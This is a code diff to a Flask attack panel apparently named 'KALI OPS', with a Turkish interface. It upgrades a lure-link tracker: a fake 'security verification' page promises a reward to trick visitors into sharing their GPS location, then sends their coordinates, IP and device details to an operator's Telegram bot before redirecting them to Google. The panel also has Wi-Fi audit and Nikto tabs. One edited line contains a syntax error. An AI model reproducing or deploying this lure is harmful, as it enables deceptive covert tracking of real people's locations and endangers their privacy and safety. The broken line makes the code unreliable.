@@ -113,7 +113,7 @@ HTML_TEMPLATE = """
         
         <div class="tabs">
             <button class="tab-btn active" onclick="switchTab('scanTab')">🚀 Recon</button>
-            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure & Tracker</button>
+            <button class="tab-btn" onclick="switchTab('lureTab')">🎯 Lure & Geolocation Tracker</button>
             <button class="tab-btn" onclick="switchTab('telegramTab')">🤖 Telegram Test</button>
             <button class="tab-btn" onclick="switchTab('wifiTab')">📶 Wi-Fi Audit</button>
             <button class="tab-btn" onclick="switchTab('niktoTab')">🛡️ Nikto</button>
@@ -143,22 +143,21 @@ HTML_TEMPLATE = """
 
         <!-- Lure Link & Tracker Sekmesi -->
         <div id="lureTab" class="tab-content">
-            <h3>🎯 Lure Link Generator & Data Exfiltration Tracker</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak özel takip linkini oluşturun ve tıklayanların IP/Cihaz verilerini toplayın.</p>
-            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Kampanya"></div>
+            <h3>🎯 Lure Link Generator & GPS/Device Tracker</h3>
+            <p style="color: #94a3b8; font-size: 13px;">Hedef kullanıcıya atılacak takip linkini üretin. Ziyaretçi tıkladığında GPS konumu ve cihaz parmak izi otomatik toplanır.</p>
+            <div class="form-group"><label>Kampanya Başlığı:</label><input type="text" id="lureTitle" value="Özel Güvenlik Raporu ve Ödül Doğrulama"></div>
             <button class="success" onclick="generateLureLink()">Takip Linki Üret</button>
             <div class="form-group" style="margin-top: 20px;">
                 <label>Oluşturulan Takip Linki:</label>
                 <input type="text" id="generatedLink" readonly style="color: #38bdf8;">
             </div>
-            <h4 style="margin-top: 25px;">🔗 Linke Tıklayan Ziyaretçi Logları:</h4>
-            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz tıklayan kimse yok.</p></div>
+            <h4 style="margin-top: 25px;">🔗 Yakalanan Ziyaretçi & GPS Logları:</h4>
+            <div id="clickLogsContainer"><p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p></div>
         </div>
 
         <!-- Telegram Test Sekmesi -->
         <div id="telegramTab" class="tab-content">
             <h3>🤖 Telegram Bot Notification Tester</h3>
-            <p style="color: #94a3b8; font-size: 13px;">Telegram botunun düzgün çalışıp çalışmadığını test etmek için chat ID girip test mesajı gönderin.</p>
             <div class="form-group"><label>Telegram Chat ID:</label><input type="text" id="testChatId" value="{{ default_chat_id }}" placeholder="örn: 123456789"></div>
             <button class="success" onclick="sendTelegramTest()">🚀 Test Mesajı Gönder</button>
             <div id="telegramTestStatus" class="terminal" style="display:none; margin-top: 15px;"></div>
@@ -166,7 +165,7 @@ HTML_TEMPLATE = """
 
         <!-- Wi-Fi Denetim Sekmesi -->
         <div id="wifiTab" class="tab-content">
-            <h3>📶 Real Wi-Fi Audit & Interface Controller (Termux / Root)</h3>
+            <h3>📶 Real Wi-Fi Audit & Interface Controller</h3>
             <div class="form-group"><label>Wireless Interface:</label><input type="text" id="wifiInterface" value="wlan0"></div>
             <div class="form-group"><label>Hedef BSSID / MAC:</label><input type="text" id="wifiBssid" placeholder="AA:BB:CC:DD:EE:FF"></div>
             <div style="display: flex; gap: 10px; flex-wrap: wrap;">
@@ -283,9 +282,12 @@ HTML_TEMPLATE = """
             let res = await fetch('/api/lure/logs');
             let data = await res.json();
             let container = document.getElementById('clickLogsContainer');
-            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz tıklayan kimse yok.</p>"; return; }
-            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz / Tarayıcı</th></tr></thead><tbody>`;
-            data.logs.forEach(l => { html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td></tr>`; });
+            if(data.logs.length === 0) { container.innerHTML = "<p style='color: #94a3b8;'>Henüz veri yakalanmadı.</p>"; return; }
+            let html = `<table><thead><tr><th>Zaman</th><th>IP Adresi</th><th>Cihaz</th><th>GPS Konum</th></tr></thead><tbody>`;
+            data.logs.forEach(l => { 
+                let loc = l.lat ? `<a href="https://maps.google.com/?q=${l.lat},${l.lon}" target="_blank" style="color:#38bdf8;">Haritada Gör (${l.lat}, ${l.lon})</a>` : "Alınamadı";
+                html += `<tr><td>${l.time}</td><td><b>${l.ip}</b></td><td>${l.ua}</td><td>${loc}</td></tr>`; 
+            });
             html += `</tbody></table>`;
             container.innerHTML = html;
         }
@@ -414,16 +416,76 @@ def index():
     if not session.get("logged_in"): return redirect(url_for("login"))
     return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)
 
+# --- GELİŞMİŞ LURE LINK VE GPS TRACKER ---
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
+    # Kullanıcıya GPS konumunu ve parmak izini isteyeceğimiz akıllı sosyal mühendislik şablonu sunuyoruz
+    return f"""
+    <!DOCTYPE html>
+    <html lang="tr">
+    <head>
+        <meta charset="UTF-8">
+        <title>Güvenlik Doğrulaması</title>
+        <style>
+            body {{ background: #0b0f15; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }}
+            .box {{ background: #121824; padding: 30px; border: 1px solid #00ff66; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.2); width: 350px; }}
+            button {{ background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }}
+            button:hover {{ background: #0369a1; }}
+        </style>
+    </head>
+    <body>
+        <div class="box">
+            <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
+            <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için konum erişimine izin verin.</p>
+            <button onclick="getLocation()">Onayla ve Devam Et</button>
+        </div>
+        <script>
+            function getLocation() {{
+                if (navigator.geolocation) {{
+                    navigator.geolocation.getCurrentPosition(sendPosition, showError, {{timeout: 10000}});
+                }} else {{
+                    redirectHome();
+                }}
+            }}
+            function sendPosition(position) {{
+                let lat = position.coords.latitude;
+                let lon = position.coords.longitude;
+                fetch('/api/lure/save-geo', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{track_id: '{track_id}', lat: lat, lon: lon}})
+                }}).finally(() => {{ redirectHome(); }});
+            }}
+            function showError(error) {{
+                redirectHome();
+            }}
+            function redirectHome() {{
+                window.location.href = "https://www.google.com";
+            }}
+        </script>
+    </body>
+    </html>
+    """
+
+@app.route("/api/lure/save-geo", methods=["POST"])
+def save_geo():
+    data = request.get_json()
+    track_id = data.get("track_id")
+    lat = data.get("lat")
+    lon = data.get("lon")
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     user_agent = request.headers.get('User-Agent', 'Bilinmeyen Cihaz')
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    CLICK_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "ua": user_agent, "track_id": track_id})
+    
+    log_entry = {"time": timestamp, "ip": visitor_ip, "ua": user_agent, "track_id": track_id, "lat": lat, "lon": lon}
+    CLICK_LOGS.insert(0, log_entry)
+    
     if NOTIFY_CHAT_ID and TOKEN:
-        try: requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": f"🚨 [LURE TRACKER] Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nCihaz: {user_agent}"}, timeout=3)
+        try:
+            msg = f"🚨 [GPS TRACKER] Konum ve Ziyaretçi Yakalandı!\nIP: {visitor_ip}\nCihaz: {user_agent}\nEnlem: {lat}\nBoylam: {lon}\nHarita: https://maps.google.com/?q={lat},{lon}"
+            requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
         except: pass
-    return """<!DOCTYPE html><html><head><meta http-equiv="refresh" content="2;url=https://www.google.com"></head><body style="background:#0b0f15;color:#00ff66;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>Yönlendiriliyor...</h2></body></html>"""
+    return jsonify({"status": "saved"})
 
 @app.route("/api/lure/logs")
 def api_lure_logs():
@@ -438,9 +500,9 @@ def api_telegram_test():
     try:
         res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Telegram bildirim testi başarılı! Bot kusursuz çalışıyor."}, timeout=5)
         if res.status_code == 200:
-            return jsonify({"output": "✅ [BAŞARILI] Test mesajı Telegram'a gönderildi! Telefonunu kontrol et."})
+            return jsonify({"output": "✅ [BAŞARILI] Test mesajı Telegram'a gönderildi!"})
         else:
-            return jsonify({"output": f"[-] Hata: Telegram API {res.status_code} kodu döndürdü."})
+            return jsonify({"output": f"[-] Hata: Telegram API {res.status_code} döndürdü."})
     except Exception as e:
         return jsonify({"output": f"[-] Bağlantı Hatası: {str(e)}"})
 
@@ -547,7 +609,7 @@ def api_download_pdf():
 
 @app.route("/api/telegram-send", methods=["POST"])
 def api_telegram_send():
-    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}}, 401
     d = request.get_json()
     res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
     return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})
